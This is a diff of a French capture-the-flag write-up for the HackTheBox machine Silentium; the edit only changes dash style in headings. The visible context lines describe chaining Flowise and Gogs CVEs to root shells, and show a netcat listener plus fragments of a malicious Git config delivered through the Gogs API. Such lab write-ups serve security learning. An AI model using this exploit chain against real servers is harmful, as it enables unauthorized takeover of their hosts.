@@ -1,4 +1,4 @@
-# Write-up — HackTheBox : Silentium
+# Write-up -- HackTheBox : Silentium 
 
 Write-up réalisé pour la machine Silentium de HackTheBox. La chaîne d'exploitation enchaîne trois vulnérabilités distinctes : un account takeover sans authentification sur Flowise (CVE-2025-58434), une RCE authentifiée sur ce même service (CVE-2025-59528) pour obtenir un accès root dans un conteneur Docker, puis une exploitation d'une CVE Gogs (CVE-2025-8110) via symlink pour obtenir un shell root sur la machine hôte.
 
@@ -6,7 +6,7 @@ L'IP de la machine pendant ma session était `10.129.38.119`.
 
 ---
 
-## Étape 1 — Scan des ports ouverts
+## Étape 1 -- Scan des ports ouverts
 
 ```bash
 nmap -A -sC -p- 10.129.38.119
@@ -30,7 +30,7 @@ On atterrit sur le site d'une société de finance indépendante : **Silentium**
 
 ---
 
-## Étape 2 — Énumération : répertoires et sous-domaines
+## Étape 2 -- Énumération : répertoires et sous-domaines
 
 On commence par chercher des répertoires cachés avec gobuster. Premier essai :
 
@@ -69,7 +69,7 @@ On ajoute ce sous-domaine à `/etc/hosts` et on visite `http://staging.silentium
 
 ---
 
-## Étape 3 — Fausse piste : injection NoSQL sur la page de login
+## Étape 3 -- Fausse piste : injection NoSQL sur la page de login
 
 On essaie quelques identifiants classiques sans succès. En testant des emails aléatoires, on remarque que le message d'erreur change selon que l'email existe ou non :
 
@@ -101,7 +101,7 @@ Pas de chance non plus. Il faut trouver une autre approche.
 
 ---
 
-## Étape 4 — CVE-2025-58434 : account takeover sans authentification
+## Étape 4 -- CVE-2025-58434 : account takeover sans authentification
 
 En cherchant des CVE liées à Flowise, on en trouve deux particulièrement intéressantes :
 
@@ -129,7 +129,7 @@ On est maintenant connecté à Flowise en tant que `ben`.
 
 ---
 
-## Étape 5 — CVE-2025-59528 : RCE authentifiée et accès root dans le conteneur
+## Étape 5 -- CVE-2025-59528 : RCE authentifiée et accès root dans le conteneur
 
 Un dépôt GitHub (https://github.com/AzureADTrent/CVE-2025-58434-59528) fournit un exploit qui enchaîne automatiquement les deux CVE. On clône le dépôt. On récupère notre clé API depuis l'interface Flowise, on démarre un listener et on lance :
 
@@ -149,7 +149,7 @@ La connexion arrive sur le listener. Surprise : **on est directement root**, Flo
 
 ---
 
-## Étape 6 — Fouille du conteneur et récupération des credentials de ben
+## Étape 6 -- Fouille du conteneur et récupération des credentials de ben
 
 On explore le répertoire `/root`. Dans `~/.flowise` on trouve la base de données SQLite et une clé d'encryption :
 
@@ -188,7 +188,7 @@ ssh ben@10.129.38.119
 
 ---
 
-## Étape 7 — Flag user
+## Étape 7 -- Flag user
 
 ```bash
 ben@silentium:~$ cat user.txt
@@ -198,7 +198,7 @@ ben@silentium:~$ cat user.txt
 
 ---
 
-## Étape 8 — Découverte de Gogs et de sa configuration
+## Étape 8 -- Découverte de Gogs et de sa configuration
 
 En fouillant `/opt`, on trouve une instance **Gogs** (un serveur Git auto-hébergé léger) : avec son fichier de configuration :
 
@@ -224,7 +224,7 @@ Deux points critiques : Gogs tourne en **`RUN_USER = root`**, et le service éco
 
 ---
 
-## Étape 9 — CVE-2025-8110 : RCE via symlink dans Gogs
+## Étape 9 -- CVE-2025-8110 : RCE via symlink dans Gogs
 
 La CVE-2025-8110 exploite le fait que Gogs ne valide pas les liens symboliques dans les dépôts Git lors des opérations d'édition de fichiers via l'API. En créant un symlink pointant vers `.git/config` et en utilisant l'API pour écraser ce symlink avec une config Git malveillante, on force Gogs à exécuter une commande arbitraire lors du prochain `git fetch` via SSH.
 
@@ -259,7 +259,7 @@ git push http://hacker:hacker@localhost:3001/hacker/pwn-repo.git master --force
 
 Le symlink pointe vers `.git/config`, c'est la pièce maîtresse de l'exploit.
 
-**3 — Récupération du SHA du blob symlink via l'API**
+**3 -- Récupération du SHA du blob symlink via l'API**
 
 ```bash
 curl -s \
@@ -279,7 +279,7 @@ curl -s \
 
 Le SHA servira à identifier le blob à écraser dans l'étape suivante.
 
-**4 — Création de la config Git malveillante**
+**4 -- Création de la config Git malveillante**
 
 On crée un fichier `bad_config` contenant une directive `sshCommand` qui ouvre un reverse shell, et on l'encode en base64 :
 
@@ -301,13 +301,13 @@ EOF
 cat /tmp/bad_config | base64 -w 0
 ```
 
-**5 — Démarrage du listener**
+**5 -- Démarrage du listener**
 
 ```bash
 nc -lvnp 4444
 ```
 
-**6 — Écrasement du fichier via l'API**
+**6 -- Écrasement du fichier via l'API**
 
 On envoie un `PUT` sur le symlink avec le contenu de notre config malveillante encodé en base64. Gogs suit le symlink et écrase `.git/config` avec notre payload :
 
@@ -328,7 +328,7 @@ Lors du prochain `git fetch` initié par Gogs (déclenché par l'API), Git lit l
 
 ---
 
-## Étape 10 — Flag root
+## Étape 10 -- Flag root
 
 ```bash
 root@silentium:~# cat root.txt
